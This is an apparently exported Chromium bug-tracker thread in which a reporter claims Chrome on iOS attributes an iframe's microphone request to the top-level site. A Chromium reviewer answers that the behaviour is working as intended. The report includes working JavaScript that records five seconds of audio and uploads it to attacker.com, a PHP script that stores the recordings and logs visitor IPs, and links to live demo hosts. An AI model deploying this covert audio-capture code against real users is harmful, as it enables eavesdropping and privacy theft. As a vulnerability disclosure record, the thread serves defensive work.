@@ -1,0 +1,200 @@
+Issue ID: 393156652
+
+Author: bu...@google.com
+<hr>
+<h3>Report description</h3>
+<p>[Chrome iOS] Origin Misrepresentation - Unauthorized Microphone Access via Iframes</p>
+<hr>
+<h3>Bug location</h3>
+<h4>Where do you want to report your vulnerability?</h4>
+<p>Chrome VRP – Report security issues affecting the Chrome browser. <a href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-widget="url" data-b-original-href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-redirected-href="https://www.google.com/url?q=https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw31QXnMd5mgu42yXMeOAv3K">See program rules</a></p>
+<h4>Which URL (or repository) have you found the vulnerability in?</h4>
+<p>132.0.6834.100 version</p>
+<hr>
+<h3>The problem</h3>
+<h4>Please describe the technical details of the vulnerability</h4>
+<p>**Step 1: **
+Host Malicious Code on attacker.com</p>
+<ol>
+<li>Create poc.html on attacker.com with the following JavaScript:</li>
+</ol>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;title&gt;Microphone Access&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;p id=&quot;status&quot;&gt;Requesting microphone access...&lt;/p&gt;
+    &lt;script&gt;
+        async function recordAudio() {
+            const status = document.getElementById(&#39;status&#39;);
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                status.textContent = &quot;Recording...&quot;;
+                const mediaRecorder = new MediaRecorder(stream);
+                const audioChunks = [];
+                
+                mediaRecorder.ondataavailable = event =&gt; {
+                    audioChunks.push(event.data);
+                };
+
+                mediaRecorder.onstop = async () =&gt; {
+                    const audioBlob = new Blob(audioChunks, { type: &#39;audio/webm&#39; });
+                    const formData = new FormData();
+                    formData.append(&#39;audio&#39;, audioBlob, &#39;recording.webm&#39;);
+
+                    await fetch(&#39;https://attacker.com/record.php&#39;, { method: &#39;POST&#39;, body: formData });
+                };
+
+                mediaRecorder.start();
+                setTimeout(() =&gt; mediaRecorder.stop(), 5000);
+            } catch (error) {
+                status.textContent = &quot;Microphone access denied&quot;;
+            }
+        }
+
+        window.onload = recordAudio;
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h1>Step 2 : Apply Permissions-Policy Headers</h1>
+<ol start="3">
+<li>In .htaccess of legit-website.com, the following security headers were applied:</li>
+</ol>
+<pre><code>&lt;IfModule mod_headers.c&gt;
+    Header set Permissions-Policy &quot;microphone=(), geolocation=(), camera=(), autoplay=(), clipboard-write=(), display-capture=()&quot;
+&lt;/IfModule&gt;
+
+</code></pre>
+<h1>Step 3  : Host PHP Logger on attacker.com</h1>
+<ol start="4">
+<li>Create record.php to store recorded audio and log user details:</li>
+</ol>
+<pre><code>&lt;?php
+if ($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;POST&#39; &amp;&amp; isset($_FILES[&#39;audio&#39;])) {
+    $uploadDir = &#39;uploads/&#39;;
+    if (!is_dir($uploadDir)) mkdir($uploadDir, 0755, true);
+    move_uploaded_file($_FILES[&#39;audio&#39;][&#39;tmp_name&#39;], $uploadDir . basename($_FILES[&#39;audio&#39;][&#39;name&#39;]));
+    file_put_contents(&#39;access.log&#39;, &quot;Microphone access granted from IP: {$_SERVER[&#39;REMOTE_ADDR&#39;]}\n&quot;, FILE_APPEND);
+    echo &quot;Audio uploaded successfully.&quot;;
+} else {
+    echo &quot;Invalid request.&quot;;
+}
+?&gt;
+</code></pre>
+<h1>Step 4:</h1>
+<ol start="4">
+<li>Embed attacker.com in legit-website.com</li>
+</ol>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;&lt;/head&gt;
+&lt;body&gt;
+    &lt;iframe id=&quot;legitimate-content&quot; src=&quot;https://attacker.com/poc.html&quot; allow=&quot;microphone&quot;&gt;&lt;/iframe&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h1>Step 5 : Test in ios chrome</h1>
+<ol start="5">
+<li>Open legit-website.com in chrome.</li>
+<li>The browser shows a permission prompt:
+&quot;</li>
+</ol>
+<pre><code>Allow legit-website.com to access your microphone?&quot;
+</code></pre>
+<ol start="7">
+<li>Click &quot;Allow&quot;.</li>
+<li>Observed Result:
+Microphone access is granted, but attacker.com (iframe) starts recording.
+This happens despite the Permissions-Policy restrictions, confirming the bug.</li>
+</ol>
+<p>you can browse to <a href="https://begbounty.xyz/beg.html" data-b-widget="url" data-b-original-href="https://begbounty.xyz/beg.html" data-b-redirected-href="https://www.google.com/url?q=https://begbounty.xyz/beg.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw15Inqd7voFJQo4DZkqx1a8">https://begbounty.xyz/beg.html</a> and you will observe the pop-up</p>
+<p>Once it shows recording is completed go to <a href="https://12x.site/access.log" data-b-widget="url" data-b-original-href="https://12x.site/access.log" data-b-redirected-href="https://www.google.com/url?q=https://12x.site/access.log&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1rAphYeJE6EeNyTnHqplbb">https://12x.site/access.log</a> and check logs</p>
+<p>you can also check recording by browsing <a href="https://12x.site/recording.webm" data-b-widget="url" data-b-original-href="https://12x.site/recording.webm" data-b-redirected-href="https://www.google.com/url?q=https://12x.site/recording.webm&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw18t98vch55Jh8lAz0AIRkf">https://12x.site/recording.webm</a></p>
+<h4>Please briefly explain who can exploit the vulnerability, and what they gain when doing so</h4>
+<p>This report highlights security vulnerability in chrome ios browser where an iframe-embedded website (attacker.com) can gain microphone access under the name of the top-level site (legit-website.com).</p>
+<p>Despite implementing Permissions-Policy headers to explicitly block microphone access, chrome continues to grant microphone permissions to the iframe (attacker.com), allowing unauthorized eavesdropping and potential privacy violations.</p>
+<h1>Impact</h1>
+<h1>User Trust Violation (UI Misrepresentation)</h1>
+<ol>
+<li>chrome displays a misleading permission prompt stating that legit-website.com is requesting microphone access.</li>
+<li>However, the actual recipient of the microphone input is attacker.com, violating user trust.</li>
+</ol>
+<h1>Eavesdropping &amp; Audio Exploitation</h1>
+<ol>
+<li>
+<p>Once the user clicks &quot;Allow&quot;, attacker.com can:</p>
+</li>
+<li>
+<p>Silently record conversations without user awareness.</p>
+</li>
+</ol>
+<h1>Bypassing Same-Origin Policy (SOP)</h1>
+<ol>
+<li>Browsers enforce Same-Origin Policy (SOP) to prevent unauthorized cross-origin interactions.
+In this case, legit-website.com embeds attacker.com within an iframe and adds allow=&quot;microphone&quot;, enabling the iframe to access microphone input.
+chrome incorrectly grants the permission to the top-level origin (legit-website.com), but the iframe (attacker.com) is the actual recipient.</li>
+</ol>
+<hr>
+<h3>The cause</h3>
+<h4>What version of Chrome have you found the security issue in?</h4>
+<p>132.0.6834.100</p>
+<h4>Is the security issue related to a crash?</h4>
+<p>No, it is not related to a crash.</p>
+<h4>Choose the type of vulnerability</h4>
+<p>Permissions Bypass</p>
+
+Author: bu...@google.com
+google_domain
+
+Author: ar...@gmail.com
+[Chrome iOS] Origin Misrepresentation - Unauthorized Microphone Access via Iframes
+
+Author: ar...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ar...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: pe...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: pe...@google.com
+google_domain
+
+Author: an...@chromium.org
+<p>This is working as intended because of the allow=microphone attribute in your iframe tag.</p>
+
+Author: an...@chromium.org
+public_non_google
+
+Author: an...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: ar...@gmail.com
+The security vulnerability in Chrome for iOS arises from a critical UI misrepresentation in permission prompts when a cross-origin iframe requests access to sensitive hardware, such as the microphone or camera. When a trusted top-level site (<a href="https://www.google.com/url?q=http://legit-website.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3iTc-IXAbkWuASxWDih7vM" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://legit-website.com" data-b-redirected-href="https://www.google.com/url?q=http://legit-website.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3iTc-IXAbkWuASxWDih7vM">legit-website.com</a>) embeds a third-party iframe (<a href="https://www.google.com/url?q=http://attacker.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1UbMTiG3FKyAMElQfPBxFn" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://attacker.com" data-b-redirected-href="https://www.google.com/url?q=http://attacker.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1UbMTiG3FKyAMElQfPBxFn">attacker.com</a>), Chrome iOS erroneously attributes the permission request to the top-level origin in the dialog (e.g., &quot;Allow <a href="https://www.google.com/url?q=http://legit-website.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3iTc-IXAbkWuASxWDih7vM" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://legit-website.com" data-b-redirected-href="https://www.google.com/url?q=http://legit-website.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3iTc-IXAbkWuASxWDih7vM">legit-website.com</a> to access your microphone?&quot;). However, the actual recipient of the permission is the embedded iframe (<a href="https://www.google.com/url?q=http://attacker.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1UbMTiG3FKyAMElQfPBxFn" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://attacker.com" data-b-redirected-href="https://www.google.com/url?q=http://attacker.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1UbMTiG3FKyAMElQfPBxFn">attacker.com</a>), which gains unauthorized access to the device. This UI spoofing directly violates user trust, as the prompt misleads users into believing they are granting access to a legitimate site, while the permissions are covertly routed to a hidden, potentially malicious origin.<br><br>The flaw is exacerbated by Chrome iOS’s reliance on WebKit (due to Apple’s engine restrictions), which does not fully enforce Chromium’s Permissions-Policy standards. While Chrome desktop would block an iframe’s allow=&quot;microphone&quot; attribute if the parent site sets Permissions-Policy: microphone=(), Chrome iOS fails to honor this hierarchy. Even in cases where no explicit policy is set, the permission prompt’s incorrect origin attribution allows attackers to exploit the ambiguity. For example, an attacker could embed a malicious iframe within a popular social media or banking site, tricking users into enabling microphone access under the guise of a trusted service. This bypasses the intent of the Same-Origin Policy (SOP), enabling cross-origin permission escalation through deceptive UI practices that Chrome’s security model is designed to prevent.<br><br>The impact of this vulnerability is severe:<br><br>Privacy Breach: Attackers can silently record audio or video, capturing sensitive conversations or environments without user knowledge.<br><br>User Trust Exploitation: By hijacking the credibility of trusted domains, attackers manipulate users into granting permissions they would otherwise deny.
+
+Author: li...@chromium.org
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: li...@chromium.org
+public_non_google
+
+Author: ar...@gmail.com
+I would like to clarify a misunderstanding as I believe the security impact has not been fully recognized. The report has marked as N/A / Duplicate, but I would appreciate the opportunity to ensure we are on the same page.<br><br>Summary of the Issue:<br>Chrome on iOS incorrectly displays the &quot;domain&quot; in permission requests prompts from third-party iframes to the top-level origin, leading to a security risk where users can be misled into granting microphone, camera, or geolocation permissions to a malicious domain embedded within a hidden iframe and which is not shown in the prompt.<br><br>Attack Scenario:<br><br>A website with an XSS or HTML injection vulnerability is exploited to inject an iframe requesting camera/microphone/geolocation permissions.<br>When the payload executes, Chrome displays a permission request under the top-level origin (the XSS-vulnerable website) instead of the actual iframe’s origin.<br>However, when the user grants permission, it is assigned to the attacker-controlled iframe domain rather than the top-level website which is not displayed on the permission prompt.<br>This contradicts the expected behavior, where permissions should be granted strictly to the requesting domain/entity (the top-level domain in this case).<br>Relation to Permission Policy Headers:<br>While some applications explicitly define Permissions-Policy headers to block third-party permission access, many websites do not.<br>This issue is not strictly related to permission policy settings—even if a vulnerable domain has no explicit policy, an attacker can still exploit this flaw using an injected iframe.<br><br>Why This Matters:<br>Users trust permission prompts based on the top-level site, but in this case, Chrome misattributes the request, leading to potential abuse.<br>This violates the principle of user awareness and control over permission grants and introduces a severe security risk.<br><br>Given the above, I would appreciate reconsideration of the report to ensure this behavior aligns with the intended security model of Chrome iOS. If needed, I am happy to provide additional PoC details to illustrate the issue further.<br>Looking forward to your thoughts.
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+google_domain
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
